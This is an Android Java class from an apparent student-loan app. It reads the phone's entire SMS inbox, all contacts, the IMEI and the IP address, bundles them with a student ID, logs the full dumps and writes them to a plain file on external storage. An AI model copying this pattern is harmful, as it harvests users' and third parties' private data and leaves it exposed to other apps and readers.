package com.eduvanz;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.NumberFormat;
import java.util.Locale;

/**
 * Created by projetctheena on 3/8/17.
 */

public class MainApplication {

    public static String TAG = "EDUVANZ LOG";
    public static String mainUrl = "http://139.59.32.234/eduvanzApi/";
    public static int previous, previousfragment3;
    public static String mainapp_courseID = "", mainapp_instituteID = "";
    public static String mainapp_locationID = "";
    public static String mainapp_loanamount = "";
    public static String mainapp_fammilyincome = "";
    public static String mainapp_doccheck = "";
    public static String mainapp_professioncheck = "";
    public static String mainapp_currentCity = "";
    static String stringAllSmsContacts;


    public static String latestSmsDate = "";

    public static String indianCurrencyFormat(String rupees) {
        double a = Double.parseDouble(rupees);

//        DecimalFormat format = new DecimalFormat("0.#");
//        System.out.println(format.format(a));

        Locale indian = new Locale("hi", "IN");
        NumberFormat indianFormat = NumberFormat.getCurrencyInstance(indian);
        String finalAmount = String.valueOf(indianFormat.format(a));
        return finalAmount;
    }

    /**
     * Read SMS
     **/
    public static void readSms(Context context, String userNo, String studentID) {
        Context c = context;
        SmsPojo objSms;
        String message = "";
        String mobileNo = "", userid = "", data = "", page = "", userName = "", imeiNo = "", simImei = "", ipaddress="";

        Log.e(TAG, "readSms: "+"Mobile No : "+ mobileNo + "studentID" + studentID );


        final String SMS_URI_INBOX = "content://sms/inbox";
        final String SMS_URI_ALL = "content://sms/";
        try {
            Uri uri = Uri.parse(SMS_URI_INBOX);
            // data which we need to show
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
//            Cursor cur = getContentResolver().query(uri, projection, null, null, null);
//            Cursor cur = getContentResolver().query(uri,projection, "address = '+919967391077'",null,null);
            Cursor cur = context.getContentResolver().query(uri, projection, null, null, null);
            //count the number of result we get
            int total = cur.getCount();
//            Log.e("MediaContent", "ReadSms :query" + cur.toString() + "\n" + total);
            JSONArray json = new JSONArray();
            JSONObject outerOb = new JSONObject();
            int d = 0;
            // showProressBar("Reading sms. Please wait...");
            if (cur.moveToFirst()) {
                for (int i = 0; i < total; i++) {
                    double final1 = ((double) i / total) * 100;
//                    Log.e(MainApplication.TAG, "readSms:progress "+final1+i);
                    int rounded = (int) Math.round(final1);
//                    if(rounded==99){
//                        rounded=100;
//                        mDialog.setProgress(rounded);
//                    }else {
//                        mDialog.setProgress(rounded);
//                    }

//                    Log.e("Readsms", "readSms: "+total );
                    objSms = new SmsPojo();
//                    String contactId = cur.getString(cur.getColumnIndex(
//                            ContactsContract.Contacts._ID));
//                    String hasPhone = cur.getString(cur.getColumnIndex(
//                            ContactsContract.Contacts.HAS_PHONE_NUMBER));
//                    Log.e(TAG, "readSms: "+contactId+"\n"+hasPhone );

                    String id = cur.getString(cur.getColumnIndexOrThrow("_id"));
                    String peron = cur.getString(cur.getColumnIndexOrThrow("person"));
                    objSms.set_address(cur.getString(cur.getColumnIndexOrThrow("address")));
                    objSms.set_msg(cur.getString(cur.getColumnIndexOrThrow("body")));
                    objSms.set_time(cur.getString(cur.getColumnIndexOrThrow("date")));
                    String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                    String type = cur.getString(cur.getColumnIndexOrThrow("type"));
//                    Log.e("Readsms", "" + objSms.get_address() + "\n" + objSms.get_msg()+
//                            "\n person"+peron+"\n type"+type+"\n ID"+id+"\n Date"+date);
                    cur.moveToNext();


                    /** INSERT DATE INTO SQL DATABASE **/
                    if (d == 0) {
                        d++;
                        DBHandler dbHandler = new DBHandler(c);
                        dbHandler.addDate(date, "1");
                        latestSmsDate = date;
                    }

                    // create new object
//                    listPojo= new ListPojo();
//                    //add data to this object
//                    listPojo.address=objSms.get_address();
//                    listPojo.message=objSms.get_msg();
//                    listPojo.type=objSms.get_time();
//                    //create ListArray
//                    mList.add(listPojo);
                    JSONObject mObject = new JSONObject();
                    mObject.accumulate("from", objSms.get_address());
                    mObject.accumulate("message", objSms.get_msg());
                    mObject.accumulate("time", objSms.get_time());
                    mObject.accumulate("type", type);
                    mObject.accumulate("sms_id", id);

                    if (!MainApplication.latestSmsDate.equalsIgnoreCase("")) {
                        long a = Long.parseLong(MainApplication.latestSmsDate) - Long.parseLong(date);
                        if (a < 0) {
                            json.put(mObject);
                        }
                    } else {
                        json.put(mObject);
                    }
                }
                TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
                imeiNo = telephonyManager.getDeviceId();
                ipaddress = Utils.getIPAddress(true);
                Log.e(TAG, "readSms: "+"IMEINO:="+imeiNo + "ipaddress:"+ipaddress);
                outerOb.accumulate("student_id", studentID);
                outerOb.accumulate("student_mobile_no", userNo);
                outerOb.accumulate("created_by_ip", ipaddress);
                outerOb.accumulate("sim_serial_no", simImei);
                outerOb.accumulate("imei", imeiNo);
                outerOb.accumulate("user", userName);
                outerOb.put("Sms_info", json);
                message = outerOb.toString();
                stringAllSmsContacts = message;
                Log.e(TAG, "smsReadSTRINGBUFF: "+stringAllSmsContacts );
//                Log.e("", "readSms: "+message );

            }
//            mCreateAndSaveFile("saveSMS.json", message);
            contactsRead(context, userNo, studentID);

        } catch (SQLiteException ex)

        {
            Log.d("SQLiteException", ex.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public static void mCreateAndSaveFile(String params, String mJsonResponse) {
        try {
            String path = "/storage/sdcard0/" + params;
//            Log.e("ReadSms", "mCreateAndSaveFile: "+path );
            final File dir = new File(Environment.getExternalStorageDirectory() + "/");
            if (dir.exists() == false) {
                dir.mkdirs();
            }
            File f = new File(dir, params);
            f.getAbsolutePath();
//            Log.e(TAG, "mCreateAndSaveFile:file path "+f.getAbsolutePath() );
            FileWriter file = new FileWriter(f.getAbsolutePath());
            file.write(mJsonResponse);
            file.flush();
            file.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    /** END of Read SMS **/


    /**
     * CONTACTS READ
     **/
    public static void contactsRead(Context c,  String userNo, String studentID) throws JSONException {
        Context context = c;
        JSONArray jsonArray = new JSONArray();
        JSONObject outerOb = new JSONObject();
        String phoneNo = "";
        String name = "";
        String imeiNo = "";
        String contacts = "";


        ContentResolver cr = c.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        try {

            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID));
                    name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));

                    if (cur.getInt(cur.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
//                            Log.e(TAG, "CONTACTS: ");
                        }
                        pCur.close();
                    }

                    JSONObject mObject = new JSONObject();
                    mObject.accumulate("contact_name", name);
                    mObject.accumulate("contact_mobile_no", phoneNo);

                    jsonArray.put(mObject);

                    TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
                    imeiNo = telephonyManager.getDeviceId();
                    String ipaddress = Utils.getIPAddress(true);
                    String simImei = "";
                    outerOb.accumulate("student_id", studentID);
                    outerOb.accumulate("student_mobile_no", userNo);
                    outerOb.accumulate("created_by_ip", ipaddress);
                    outerOb.accumulate("sim_serial_no", simImei);
                    outerOb.accumulate("imei", imeiNo);
                    outerOb.put("contacts_info", jsonArray);
                    contacts = outerOb.toString();
                    stringAllSmsContacts += contacts;
                    Log.e(TAG, "contactsReadSTRINGBUFF: "+stringAllSmsContacts );
                    mCreateAndSaveFile("saveSMS.json", stringAllSmsContacts);
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /** END OF CONTACTS READ **/


}
